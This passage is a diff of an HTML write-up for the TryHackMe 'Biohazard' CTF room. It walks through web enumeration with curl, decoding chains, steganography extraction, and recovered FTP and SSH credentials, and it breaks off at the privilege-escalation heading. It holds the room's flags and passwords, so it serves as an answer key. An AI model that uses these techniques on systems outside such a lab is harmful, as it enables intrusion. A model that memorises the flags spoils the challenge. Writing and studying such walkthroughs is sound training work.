@@ -151,7 +151,6 @@
         .meta-key { color: var(--fg-dim); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
         .meta-val { color: var(--fg); }
         .meta-val.flag { color: var(--aqua); font-weight: 700; background: rgba(142,192,124,.08); padding: 0 6px; border-radius: var(--r-xs); }
-        .meta-val.severity { color: var(--red); font-weight: 700; }
 
         /* ARTICLE */
         .writeup { max-width: 820px; margin: 0 auto; padding: 0 1.5rem; position: relative; z-index: 10; }
@@ -197,9 +196,6 @@
         .cmt { color: var(--fg-dim); font-style: italic; }
         .num { color: var(--purple); }
         .op  { color: var(--orange); }
-        .out { color: var(--aqua); }
-        .dim { color: var(--fg-dim); }
-        .path { color: var(--blue); }
         .flag-hl { color: var(--aqua); font-weight: 700; background: rgba(142,192,124,.1); padding: 0 4px; border-radius: 3px; }
         .cmd-p { color: var(--orange); font-weight: 700; }
         .out-line { color: var(--aqua); }
@@ -208,6 +204,7 @@
             background: var(--bg-code); border: 1px solid var(--border); border-left: 3px solid var(--aqua);
             border-radius: var(--r-xs); padding: .7rem 1rem; margin: .8rem 0;
             font-size: clamp(.62rem,1.5vw,.72rem); line-height: 1.7;
+            font-family: 'JetBrains Mono', monospace;
         }
 
         /* Attack Chain */
@@ -222,7 +219,7 @@
         .chain-detail { font-size: .6rem; color: var(--fg-dim); line-height: 1.5; }
         .chain-detail code { background: var(--bg-code); border: 1px solid var(--border); padding: 0 4px; border-radius: 3px; color: var(--yellow); font-size: .58rem; }
 
-        /* Vuln Table */
+        /* Tables */
         .vuln-table-wrap { overflow-x: auto; margin: 1rem 0; }
         .vuln-table { width: 100%; border-collapse: collapse; font-size: clamp(.58rem,1.4vw,.68rem); }
         .vuln-table th { background: var(--bg-raised); color: var(--fg-dim); font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; font-size: .55rem; padding: .55rem .7rem; text-align: left; border-bottom: 1px solid var(--border-mid); }
@@ -232,6 +229,17 @@
         .sev-high { color: var(--orange); font-weight: 700; }
         .sev-med  { color: var(--yellow); font-weight: 700; }
         .sev-low  { color: var(--blue); font-weight: 600; }
+
+        .decode-table { width:100%;border-collapse:collapse;margin:1rem 0;font-size:clamp(.55rem,1.3vw,.65rem); }
+        .decode-table th { background:var(--bg-raised);color:var(--fg-dim);font-weight:700;text-transform:uppercase;letter-spacing:1.5px;font-size:.52rem;padding:.5rem .7rem;text-align:left;border-bottom:1px solid var(--border-mid); }
+        .decode-table td { padding:.5rem .7rem;border-bottom:1px solid var(--border);color:var(--fg-muted);vertical-align:top; }
+        .decode-table tr:hover td { background:rgba(250,189,47,.02); }
+
+        /* Item grid */
+        .item-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px,1fr)); gap: .5rem; margin: 1rem 0; }
+        .item-box { background: var(--bg-code); border: 1px solid var(--border); border-radius: var(--r-sm); padding: .6rem .9rem; }
+        .item-name { font-size: .6rem; font-weight: 700; color: var(--orange); text-transform: uppercase; letter-spacing: 1px; margin-bottom: .2rem; }
+        .item-val { font-size: .58rem; color: var(--fg-dim); word-break: break-all; }
 
         /* Takeaway */
         .takeaway-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: .7rem; margin: 1rem 0; }
@@ -248,24 +256,8 @@
         .flag-label { font-size: .55rem; color: var(--aqua); text-transform: uppercase; letter-spacing: 3px; font-weight: 700; margin-bottom: .3rem; }
         .flag-value { font-family: 'JetBrains Mono', monospace; font-size: clamp(.85rem,2.5vw,1.2rem); font-weight: 700; color: var(--aqua); text-shadow: 0 0 20px rgba(142,192,124,.25); letter-spacing: 1px; position: relative; word-break: break-all; }
 
-        /* Item collect boxes */
-        .item-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px,1fr)); gap: .5rem; margin: 1rem 0; }
-        .item-box { background: var(--bg-code); border: 1px solid var(--border); border-radius: var(--r-sm); padding: .6rem .9rem; }
-        .item-name { font-size: .6rem; font-weight: 700; color: var(--orange); text-transform: uppercase; letter-spacing: 1px; margin-bottom: .2rem; }
-        .item-val { font-size: .58rem; color: var(--fg-dim); word-break: break-all; }
-
-        /* Decode table */
-        .decode-table { width:100%;border-collapse:collapse;margin:1rem 0;font-size:clamp(.55rem,1.3vw,.65rem); }
-        .decode-table th { background:var(--bg-raised);color:var(--fg-dim);font-weight:700;text-transform:uppercase;letter-spacing:1.5px;font-size:.52rem;padding:.5rem .7rem;text-align:left;border-bottom:1px solid var(--border-mid); }
-        .decode-table td { padding:.5rem .7rem;border-bottom:1px solid var(--border);color:var(--fg-muted);vertical-align:top; }
-        .decode-table tr:hover td { background:rgba(250,189,47,.02); }
-
-        /* Exploit header */
-        .exploit-header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: .5rem; margin-bottom: 1rem; }
-        .exploit-title-group { display: flex; align-items: center; gap: .7rem; }
-        .exploit-icon { width: 36px; height: 36px; border-radius: var(--r-sm); background: rgba(250,189,47,.1); border: 1px solid rgba(250,189,47,.25); display: flex; align-items: center; justify-content: center; color: var(--yellow); font-size: .9rem; }
-        .gh-link { display: inline-flex; align-items: center; gap: .4rem; font-size: .6rem; font-weight: 700; color: var(--blue); text-decoration: none; text-transform: uppercase; letter-spacing: 1px; padding: .3rem .7rem; border: 1px solid rgba(131,165,152,.25); border-radius: var(--r-pill); transition: all .2s; }
-        .gh-link:hover { background: var(--blue); color: var(--black); }
+        /* Sub-heading */
+        .sub-h { color: var(--blue); font-size: .9rem; font-weight: 700; margin: 1.2rem 0 .4rem; font-family: 'Orbitron', monospace; letter-spacing: .5px; }
 
         /* Footer */
         .footer { border-top: 1px solid var(--border); background: var(--bg-card); padding: 1.5rem; text-align: center; position: relative; z-index: 10; }
@@ -305,9 +297,9 @@
         <p class="hero-sub">TryHackMe &middot; Web Enumeration / Steganography / Encoding Chains &middot; Medium &middot; by 0xb0rn3</p>
         <div class="meta-grid">
             <span class="meta-key">Platform</span>   <span class="meta-val">TryHackMe</span>
-            <span class="meta-key">Theme</span>       <span class="meta-val">Resident Evil — Spencer Mansion</span>
+            <span class="meta-key">Theme</span>       <span class="meta-val">Resident Evil (RE1) — Spencer Mansion</span>
             <span class="meta-key">Difficulty</span>  <span class="meta-val" style="color:var(--orange);font-weight:700;">Medium</span>
-            <span class="meta-key">Services</span>    <span class="meta-val">FTP / SSH / HTTP (Apache 2.4.29)</span>
+            <span class="meta-key">Services</span>    <span class="meta-val">FTP (21) / SSH (22) / HTTP (80)</span>
             <span class="meta-key">Stack</span>       <span class="meta-val">Web Enum + Stego + GPG + Vigenere + PrivEsc</span>
             <span class="meta-key">Flags</span>       <span class="meta-val flag">7 collectibles + root flag</span>
         </div>
@@ -324,8 +316,8 @@
                     <h2 class="step-title">Overview</h2>
                 </div>
             </div>
-            <p class="prose">Biohazard is a <strong>Resident Evil-themed CTF</strong> that simulates exploring the Spencer Mansion. Rather than a single vulnerability, it chains together a long sequence of skills: web room enumeration with hidden HTML comments, form-based item collection, multi-step encoding/decoding puzzles across base64/base32/base58, FTP steganography extraction across three JPEG images, GPG decryption, and two layers of Vigenere cipher to finally pivot into SSH and escalate to root via a sudo-enabled user.</p>
-            <p class="prose">Every collectible item found in the mansion is required to unlock the next area — skip one and the chain breaks. The full path from HTTP root to root shell requires 10 sequential phases.</p>
+            <p class="prose">Biohazard is a <strong>Resident Evil-themed CTF</strong> that follows Jill Valentine through the Spencer Mansion. Players must explore a series of interconnected web rooms, collect items/keys, decode ciphers, extract FTP files, and ultimately gain SSH access then escalate to root. The challenge combines web enumeration, steganography, encoding/decoding chains, and Linux privilege escalation.</p>
+            <p class="prose">Every collectible item found in the mansion is required to unlock the next area — skip one and the chain breaks. The full path from HTTP root to root shell requires 6 sequential phases.</p>
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">ATTACK CHAIN</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre>Phase 1  Web Rooms    → emblem, lock_pick, blue_jewel (HTML source mining)
@@ -333,8 +325,7 @@ Phase 2  Item Collect → Crests 1-4 (form POSTs, ROT13, base32, bar room chain)
 Phase 3  Decode Chain → 4x multi-encoding → FTP user:pass
 Phase 4  FTP + Stego  → 3 JPEG key parts (steghide / EXIF / ZIP) → GPG pass
 Phase 5  GPG Decrypt  → helmet_key → unlock study room + hidden closet
-Phase 6  SSH Access   → umbrella_guest (T_virus_rules)
-Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root</pre></div>
+Phase 6  SSH Access   → umbrella_guest → MO Disk 2 key → Vigenere → weasker → sudo root</pre></div>
             </div>
         </section>
 
@@ -344,7 +335,7 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
                 <div class="step-num">1</div>
                 <div>
                     <div class="step-label">Reconnaissance</div>
-                    <h2 class="step-title">Port Scan & Service Discovery</h2>
+                    <h2 class="step-title">Port Scan &amp; Service Discovery</h2>
                 </div>
             </div>
             <div class="code-block">
@@ -356,7 +347,7 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
                     <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
                     <tbody>
                         <tr><td><code>21/tcp</code></td><td>FTP</td><td>vsftpd 3.0.3</td></tr>
-                        <tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu</td></tr>
+                        <tr><td><code>22/tcp</code></td><td>SSH</td><td>OpenSSH 7.6p1 (Ubuntu)</td></tr>
                         <tr><td><code>80/tcp</code></td><td>HTTP</td><td>Apache 2.4.29 (Ubuntu)</td></tr>
                     </tbody>
                 </table>
@@ -373,7 +364,19 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
                     <h2 class="step-title">Phase 1 — Mansion Room Crawl</h2>
                 </div>
             </div>
-            <p class="prose">The web root contains an HTML comment pointing to <code>/mansionmain/</code>. Each room page reveals the next via comments, redirects, or hints buried in the page source. The progression:</p>
+            <p class="prose">The web root contains an HTML comment pointing to <code>/mansionmain/</code>. Each room page reveals the next via comments, redirects, or hints buried in the page source. The full navigation path:</p>
+
+            <div class="code-block">
+                <div class="code-bar"><span class="code-lang">NAVIGATION CHAIN</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+                <div class="code-body"><pre>/             → source comment: &lt;!-- href="/mansionmain/" --&gt;
+/mansionmain/ → hint to /diningRoom/
+/diningRoom/  → emblem.php gives emblem flag
+              → base64 comment → /teaRoom/
+/teaRoom/     → master_of_unlock.html → lock_pick flag
+              → hint to /artRoom/
+/artRoom/     → MansionMap.html → full room list</pre></div>
+            </div>
+
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="cmd-p">$</span> curl -s http://TARGET/ | grep -i href
@@ -382,15 +385,16 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
 <span class="cmd-p">$</span> curl -s http://TARGET/diningRoom/emblem.php
 <span class="out-line">emblem{fec832623ea498e20bf4fe1821d58727}</span>
 
-<span class="cmd-p">$</span> curl -s http://TARGET/diningRoom/ | base64 -d <span class="cmt"># base64 comment → /teaRoom/</span>
+<span class="cmd-p">$</span> curl -s http://TARGET/diningRoom/ | base64 -d  <span class="cmt"># base64 comment → /teaRoom/</span>
 
 <span class="cmd-p">$</span> curl -s http://TARGET/teaRoom/master_of_unlock.html
 <span class="out-line">lock_pick{037b35e2ff90916a9abf99129c8e1837}</span>
 
-<span class="cmd-p">$</span> curl -s http://TARGET/artRoom/MansionMap.html  <span class="cmt"># full room list</span></pre></div>
+<span class="cmd-p">$</span> curl -s http://TARGET/artRoom/MansionMap.html  <span class="cmt"># reveals all remaining room URLs</span></pre></div>
             </div>
 
-            <p class="prose"><code>/diningRoom2F/</code> contains a ROT13-encoded comment that decodes to "Visit sapphire.html":</p>
+            <p class="prose"><code>/diningRoom2F/</code> contains a ROT13-encoded comment. Decoded: <strong>"Visit sapphire.html"</strong>:</p>
+
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="cmd-p">$</span> curl -s http://TARGET/diningRoom/sapphire.html
@@ -400,15 +404,15 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
             <div class="item-grid">
                 <div class="item-box">
                     <div class="item-name">Emblem</div>
-                    <div class="item-val">fec832623ea498e20bf4fe1821d58727</div>
+                    <div class="item-val">emblem{fec832623ea498e20bf4fe1821d58727}</div>
                 </div>
                 <div class="item-box">
                     <div class="item-name">Lock Pick</div>
-                    <div class="item-val">037b35e2ff90916a9abf99129c8e1837</div>
+                    <div class="item-val">lock_pick{037b35e2ff90916a9abf99129c8e1837}</div>
                 </div>
                 <div class="item-box">
                     <div class="item-name">Blue Jewel</div>
-                    <div class="item-val">e1d457e96cac640f863ec7bc475d48aa</div>
+                    <div class="item-val">blue_jewel{e1d457e96cac640f863ec7bc475d48aa}</div>
                 </div>
             </div>
         </section>
@@ -424,58 +428,67 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
             </div>
             <p class="prose">Each crest is hidden behind a form POST or encoded in a room's content. All four are required to derive the FTP credentials.</p>
 
-            <h3 style="color:var(--blue);font-size:.9rem;font-weight:700;margin:.8rem 0 .4rem;">Crest 1 — Tiger Status Room</h3>
+            <h3 class="sub-h">Crest 1 — Tiger Status Room</h3>
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="cmd-p">$</span> curl -s -X POST http://TARGET/tigerStatusRoom/gem.php \
     -d "gem=blue_jewel{e1d457e96cac640f863ec7bc475d48aa}"
-<span class="out-line">S0pXRkVVS0pKQkxIVVdTWUpFM0VTUlk9</span>   <span class="cmt"># Crest 1 (base64-encoded)</span></pre></div>
+<span class="out-line">Crest 1: S0pXRkVVS0pKQkxIVVdTWUpFM0VTUlk9</span>  <span class="cmt"># base64-encoded</span></pre></div>
             </div>
 
-            <h3 style="color:var(--blue);font-size:.9rem;font-weight:700;margin:.8rem 0 .4rem;">Crest 2 — Gallery Room</h3>
+            <h3 class="sub-h">Crest 2 — Gallery Room</h3>
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="cmd-p">$</span> curl -s http://TARGET/galleryRoom/note.txt
-<span class="out-line">GVFWK5KHK5WTGTCILE4DKY3DNN4GQQRTM5AVCTKE</span>   <span class="cmt"># Crest 2 (base32-encoded)</span></pre></div>
+<span class="out-line">Crest 2: GVFWK5KHK5WTGTCILE4DKY3DNN4GQQRTM5AVCTKE</span>  <span class="cmt"># base32-encoded</span></pre></div>
             </div>
 
-            <h3 style="color:var(--blue);font-size:.9rem;font-weight:700;margin:.8rem 0 .4rem;">Crests 3 &amp; 4 — Bar Room Chain → Shield Key → Armor Room / Attic</h3>
-            <p class="prose">The bar room requires the <code>lock_pick</code> to unlock. Its secret URL is returned as a redirect header. Inside: a base32-encoded music note that unlocks a piano, which redirects to a hidden room containing the <code>gold_emblem</code>. Posting the gold emblem to <code>/diningRoom/emblem_slot.php</code> returns a Vigenere-ciphered hint (key: <code>rebecca</code>) that reveals the shield key HTML page:</p>
+            <h3 class="sub-h">Crests 3 &amp; 4 — Bar Room Chain → Shield Key → Armor Room / Attic</h3>
+            <p class="prose">The bar room requires the <code>lock_pick</code> to unlock. The secret URL is returned as a <code>Location</code> redirect header. Inside, a base32-encoded music note decodes to the <code>music_sheet</code> — POSTed to <code>piano.php</code>, which redirects to <code>barRoomHidden.php</code> containing the <code>gold_emblem</code>. Posting that to <code>/diningRoom/emblem_slot.php</code> returns a Vigenere ciphertext (key: <code>rebecca</code>) revealing the shield key page name:</p>
+
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-                <div class="code-body"><pre><span class="cmt"># 1. Unlock bar room</span>
+                <div class="code-body"><pre><span class="cmt"># 1. Unlock bar room with lock_pick</span>
 <span class="cmd-p">$</span> curl -sv -X POST http://TARGET/barRoom/unlock_door.php \
-    -d "door_flag=lock_pick{...}" 2>&amp;1 | grep Location
+    -d "door_flag=lock_pick{037b35e2ff90916a9abf99129c8e1837}" 2>&amp;1 | grep Location
 <span class="out-line">Location: ../barRoom357162e3db904857963e6e0b64b96ba7/</span>
 
 <span class="cmt"># 2. Decode music note (base32)</span>
-<span class="cmd-p">$</span> curl -s http://TARGET/barRoom357.../musicNote.html | python3 -c \
-    "import sys,base64; print(base64.b32decode(sys.stdin.read().strip()).decode())"
+<span class="cmd-p">$</span> curl -s http://TARGET/barRoom357162e3db904857963e6e0b64b96ba7/musicNote.html | \
+    python3 -c "import sys,base64; print(base64.b32decode(sys.stdin.read().strip()).decode())"
 <span class="out-line">music_sheet{362d72deaf65f5bdc63daece6a1f676e}</span>
 
-<span class="cmt"># 3. Piano → hidden room → gold emblem</span>
-<span class="cmd-p">$</span> curl -s http://TARGET/barRoom357.../gold_emblem.php
+<span class="cmt"># 3. POST music_sheet to piano.php → redirect → barRoomHidden.php</span>
+<span class="cmd-p">$</span> curl -s http://TARGET/barRoom357162e3db904857963e6e0b64b96ba7/gold_emblem.php
 <span class="out-line">gold_emblem{58a8c41a9d08b8a4e38d02a4d7ff4843}</span>
 
-<span class="cmt"># 4. Vigenere decode (key=rebecca) → the_great_shield_key.html</span>
+<span class="cmt"># 4. POST gold_emblem → Vigenere ciphertext (key: rebecca)</span>
+<span class="cmt"># → "there is a shield key inside the dining room.</span>
+<span class="cmt">#    the html page is called the_great_shield_key"</span>
 <span class="cmd-p">$</span> curl -s http://TARGET/diningRoom/the_great_shield_key.html
 <span class="out-line">shield_key{48a7a9227cd7eb89f0a062590798cbac}</span></pre></div>
             </div>
 
-            <p class="prose">With the shield key, unlock the Armor Room and Attic — each note contains a crest encoded in a different scheme:</p>
+            <p class="prose">With the <code>shield_key</code>, unlock the Armor Room and Attic. Each note yields a crest with a different encoding depth:</p>
+
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-                <div class="code-body"><pre><span class="cmt"># Armor Room → Crest 3: base64 → binary string → hex → ASCII</span>
-<span class="cmd-p">$</span> curl -s http://TARGET/armorRoom.../note.txt  <span class="cmt"># long base64 of space-separated binary</span>
+                <div class="code-body"><pre><span class="cmt"># Armor Room → Crest 3 (base64 → binary → hex, encoded 3x)</span>
+<span class="cmd-p">$</span> curl -sv -X POST http://TARGET/armorRoom/unlock_door.php \
+    -d "door_flag=shield_key{48a7a9227cd7eb89f0a062590798cbac}" 2>&amp;1 | grep Location
+<span class="cmd-p">$</span> curl -s http://TARGET/armorRoom.../note.txt
 
-<span class="cmt"># Attic → Crest 4: base58 → hex → base64 → ASCII</span>
-<span class="cmd-p">$</span> curl -s http://TARGET/attic.../note.txt      <span class="cmt"># base58 string</span></pre></div>
+<span class="cmt"># Attic → Crest 4 (base58 → hex, encoded 2x)</span>
+<span class="cmd-p">$</span> curl -sv -X POST http://TARGET/attic/unlock_door.php \
+    -d "door_flag=shield_key{48a7a9227cd7eb89f0a062590798cbac}" 2>&amp;1 | grep Location
+<span class="cmd-p">$</span> curl -s http://TARGET/attic.../note.txt
+<span class="out-line">Crest 4: gSUERauVpvKzRpyPpuYz66JDmRTbJubaoArM6CAQsnVwte6zF9J4GGYyun3k5qM9ma4s</span></pre></div>
             </div>
 
             <div class="item-grid">
-                <div class="item-box"><div class="item-name">Music Sheet</div><div class="item-val">362d72deaf65f5bdc63daece6a1f676e</div></div>
-                <div class="item-box"><div class="item-name">Gold Emblem</div><div class="item-val">58a8c41a9d08b8a4e38d02a4d7ff4843</div></div>
-                <div class="item-box"><div class="item-name">Shield Key</div><div class="item-val">48a7a9227cd7eb89f0a062590798cbac</div></div>
+                <div class="item-box"><div class="item-name">Music Sheet</div><div class="item-val">music_sheet{362d72deaf65f5bdc63daece6a1f676e}</div></div>
+                <div class="item-box"><div class="item-name">Gold Emblem</div><div class="item-val">gold_emblem{58a8c41a9d08b8a4e38d02a4d7ff4843}</div></div>
+                <div class="item-box"><div class="item-name">Shield Key</div><div class="item-val">shield_key{48a7a9227cd7eb89f0a062590798cbac}</div></div>
             </div>
         </section>
 
@@ -488,16 +501,16 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
                     <h2 class="step-title">Phase 3 — Crest Decode Chain → FTP Credentials</h2>
                 </div>
             </div>
-            <p class="prose">The four crests are fragments of a base64-encoded string that contains FTP credentials. Each fragment is encoded differently and must be decoded independently before being concatenated:</p>
+            <p class="prose">The four crests are fragments of a base64-encoded string containing FTP credentials. Each fragment uses a different encoding chain and must be decoded independently before being concatenated:</p>
 
             <div class="vuln-table-wrap">
                 <table class="decode-table">
-                    <thead><tr><th>Crest</th><th>Raw (truncated)</th><th>Decoding Method</th><th>Result Fragment</th></tr></thead>
+                    <thead><tr><th>Crest</th><th>Raw Value</th><th>Decoding Method</th><th>Fragment</th></tr></thead>
                     <tbody>
-                        <tr><td>1</td><td><code>S0pXRkVVS0pKQkxIVVdT...</code></td><td>base64 → base32</td><td><code>RlRQIHVzZXI6IG</code></td></tr>
-                        <tr><td>2</td><td><code>GVFWK5KHK5WTGTCIL...</code></td><td>base32 → base58</td><td><code>h1bnRlciwgRlRQ...</code></td></tr>
-                        <tr><td>3</td><td><code>(base64 of binary bits)</code></td><td>base64 → binary str → hex</td><td><code>c3M6IHlvdV9jYW...</code></td></tr>
-                        <tr><td>4</td><td><code>gSUERauVpvKzRpyPp...</code></td><td>base58 → hex → base64</td><td><code>pZGVfZm9yZXZlcg==</code></td></tr>
+                        <tr><td>1</td><td><code>S0pXRkVVS0pKQkxIVVdTWUpFM0VTUlk9</code></td><td>base64 → base32</td><td><code>RlRQIHVzZXI6IG</code></td></tr>
+                        <tr><td>2</td><td><code>GVFWK5KHK5WTGTCILE4DKY3DNN4GQQRTM5AVCTKE</code></td><td>base32 → base58</td><td><code>h1bnRlciwgRlRQIHBh</code></td></tr>
+                        <tr><td>3</td><td><code>(base64 of space-separated binary bits)</code></td><td>base64 → binary → hex</td><td><code>c3M6IHlvdV9jYW50X2h</code></td></tr>
+                        <tr><td>4</td><td><code>gSUERauVpvKzRpyPpuYz66JDmRTbJubaoArM6CAQsnVwte6zF9J4GGYyun3k5qM9ma4s</code></td><td>base58 → hex</td><td><code>pZGVfZm9yZXZlcg==</code></td></tr>
                     </tbody>
                 </table>
             </div>
@@ -506,15 +519,13 @@ Phase 7  Vigenere x2  → weasker:stars_members_are_my_guinea_pig → sudo root<
                 <div class="code-bar"><span class="code-lang">PYTHON3</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="kw">import</span> base64
 
-<span class="cmt"># Concatenate all four decoded fragments, then base64 decode the whole thing</span>
-combined = c1 + c2 + c3 + c4
-result = base64.b64decode(combined + <span class="str">"=="</span>).decode()
+<span class="cmt"># Concatenate all four decoded fragments, then base64 decode</span>
+combined = <span class="str">"RlRQIHVzZXI6IGh1bnRlciwgRlRQIHBhc3M6IHlvdV9jYW50X2hpZGVfZm9yZXZlcg=="</span>
+result = base64.b64decode(combined).decode()
 <span class="kw">print</span>(result)</pre></div>
             </div>
 
-            <div class="response-block">
-                FTP user: hunter, FTP pass: you_cant_hide_forever
-            </div>
+            <div class="response-block">FTP user: hunter, FTP pass: you_cant_hide_forever</div>
 
             <div class="flag-banner">
                 <div class="flag-label"><i class="fas fa-key"></i> &nbsp;FTP Credentials Recovered</div>
@@ -531,13 +542,18 @@ result = base64.b64decode(combined + <span class="str">"=="</span>).decode()
                     <h2 class="step-title">Phase 4 — FTP Files &amp; Three-Part Key Assembly</h2>
                 </div>
             </div>
-            <p class="prose">FTP as <code>hunter</code> reveals five files: three JPEG images, an encrypted GPG file, and a note from Barry hinting that the helmet key is in the GPG file and a <code>/hidden_closet/</code> path exists. Each JPEG hides a key fragment using a different steganography method:</p>
+            <p class="prose">FTP as <code>hunter</code> exposes five files: three JPEG images, a GPG-encrypted file, and <code>important.txt</code> — Barry's note confirming the helmet key is inside the GPG file and that a <code>/hidden_closet/</code> path exists. Each JPEG conceals a key fragment via a different steganography method:</p>
 
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="cmd-p">$</span> curl -s --user "hunter:you_cant_hide_forever" \
-    "ftp://TARGET/{001-key.jpg,002-key.jpg,003-key.jpg,helmet_key.txt.gpg}" \
-    -o "#1" <span class="cmt"># download all four files</span>
+    "ftp://TARGET/001-key.jpg" -o 001-key.jpg
+<span class="cmd-p">$</span> curl -s --user "hunter:you_cant_hide_forever" \
+    "ftp://TARGET/002-key.jpg" -o 002-key.jpg
+<span class="cmd-p">$</span> curl -s --user "hunter:you_cant_hide_forever" \
+    "ftp://TARGET/003-key.jpg" -o 003-key.jpg
+<span class="cmd-p">$</span> curl -s --user "hunter:you_cant_hide_forever" \
+    "ftp://TARGET/helmet_key.txt.gpg" -o helmet_key.txt.gpg
 
 <span class="cmt"># 001-key.jpg → steghide (empty password)</span>
 <span class="cmd-p">$</span> steghide extract -sf 001-key.jpg -p ""
@@ -547,12 +563,15 @@ result = base64.b64decode(combined + <span class="str">"=="</span>).decode()
 <span class="cmd-p">$</span> exiftool 002-key.jpg | grep Comment
 <span class="out-line">Comment: 5fYmVfZGVzdHJveV9</span>
 
-<span class="cmt"># 003-key.jpg → ZIP file appended to JPEG</span>
+<span class="cmt"># 003-key.jpg → ZIP file appended to JPEG → key-003.txt</span>
 <span class="cmd-p">$</span> cp 003-key.jpg 003-key.zip &amp;&amp; unzip 003-key.zip
 <span class="out-line">key3: 3aXRoX3Zqb2x0</span>
 
-<span class="cmt"># Assemble + base64 decode</span>
-<span class="cmd-p">$</span> python3 -c "import base64; print(base64.b64decode('cGxhbnQ0Ml9jYW5fYmVfZGVzdHJveV93aXRoX3Zqb2x0==').decode())"
+<span class="cmt"># Assemble key1 + key2 + key3, then base64 decode</span>
+<span class="cmd-p">$</span> python3 -c "
+import base64
+print(base64.b64decode('cGxhbnQ0Ml9jYW5fYmVfZGVzdHJveV93aXRoX3Zqb2x0').decode())
+"
 <span class="out-line" style="color:var(--red);font-weight:700;">plant42_can_be_destroy_with_vjolt</span></pre></div>
             </div>
 
@@ -579,29 +598,29 @@ result = base64.b64decode(combined + <span class="str">"=="</span>).decode()
                     <h2 class="step-title">Phase 5 — Study Room &amp; Hidden Closet</h2>
                 </div>
             </div>
-            <p class="prose">The <code>helmet_key</code> unlocks two secret rooms whose URLs are returned as redirect headers from their respective <code>unlock_door.php</code> endpoints.</p>
+            <p class="prose">The <code>helmet_key</code> unlocks two secret rooms. Their hashed URLs are returned as <code>Location</code> redirect headers from the respective <code>unlock_door.php</code> endpoints.</p>
 
             <div class="code-block">
                 <div class="code-bar"><span class="code-lang">BASH</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
                 <div class="code-body"><pre><span class="cmt"># Study Room → doom.tar.gz → eagle_medal.txt → SSH user</span>
 <span class="cmd-p">$</span> curl -sv -X POST http://TARGET/studyRoom/unlock_door.php \
-    -d "door_flag=helmet_key{...}" 2>&amp;1 | grep Location
+    -d "door_flag=helmet_key{458493193501d2b94bbab2e727f8db4b}" 2>&amp;1 | grep Location
 <span class="out-line">Location: ../studyRoom28341c5e98c93b89258a6389fd608a3c/</span>
 
-<span class="cmd-p">$</span> curl -s http://TARGET/studyRoom28341.../doom.tar.gz | tar -xz
+<span class="cmd-p">$</span> curl -s http://TARGET/studyRoom28341c5e98c93b89258a6389fd608a3c/doom.tar.gz | tar -xz
 <span class="out-line">eagle_medal.txt → SSH user: umbrella_guest</span>
 
-<span class="cmt"># Hidden Closet → wolf_medal.txt → SSH pass + MO_DISK1.txt</span>
+<span class="cmt"># Hidden Closet → wolf_medal.txt → SSH pass + MO_DISK1 cipher</span>
 <span class="cmd-p">$</span> curl -sv -X POST http://TARGET/hidden_closet/unlock_door.php \
-    -d "door_flag=helmet_key{...}" 2>&amp;1 | grep Location
+    -d "door_flag=helmet_key{458493193501d2b94bbab2e727f8db4b}" 2>&amp;1 | grep Location
 <span class="out-line">Location: ../hiddenCloset8997e740cb7f5cece994381b9477ec38/</span>
 
-<span class="cmd-p">$</span> curl -s http://TARGET/hiddenCloset8997.../wolf_medal.txt
+<span class="cmd-p">$</span> curl -s http://TARGET/hiddenCloset8997e740cb7f5cece994381b9477ec38/wolf_medal.txt
 <span class="out-line">SSH password: T_virus_rules</span>
 
-<span class="cmd-p">$</span> curl -s http://TARGET/hiddenCloset8997.../MO_DISK1.txt
+<span class="cmd-p">$</span> curl -s http://TARGET/hiddenCloset8997e740cb7f5cece994381b9477ec38/MO_DISK1.txt
 <span class="out-line">wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk</span>
-<span class="cmt"># ↑ Vigenere cipher — key unknown yet</span></pre></div>
+<span class="cmt"># ↑ Vigenere cipher — key found in next phase</span></pre></div>
             </div>
         </section>
 
@@ -611,14 +630,14 @@ result = base64.b64decode(combined + <span class="str">"=="</span>).decode()
                 <div class="step-num">7</div>
                 <div>
                     <div class="step-label">Initial Access → Privilege Escalation</div>
-                    <h2 class="step-title">Phase 6 &amp; 7 — SSH, Vigenere × 2, Root</h2>
